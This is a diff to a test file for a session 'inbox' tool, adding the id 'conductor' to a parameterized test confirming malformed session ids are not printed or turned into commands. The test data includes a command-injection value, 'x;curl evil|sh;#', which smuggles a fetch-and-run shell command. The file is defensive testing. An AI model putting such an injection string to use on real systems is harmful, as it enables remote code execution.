@@ -1646,7 +1646,9 @@ describe('needsYou', () => {
     expect(inbox()[0]?.answer).toBe('(PR url outside the pull-request shape; inspect the store)');
   });
 
-  it.each(['x;curl evil|sh;#', 'x → pup merge s-other --pr', 'victim '])(
+  // `conductor` too: `pup answer conductor` names the conductor's question, so
+  // a session row by that name must not print as a target (decision 93).
+  it.each(['x;curl evil|sh;#', 'x → pup merge s-other --pr', 'victim ', 'conductor'])(
     'neither prints nor builds a command around the session id %j, outside the minted shape',
     (id) => {
       seedIn(id, ['running', 'blocked']);
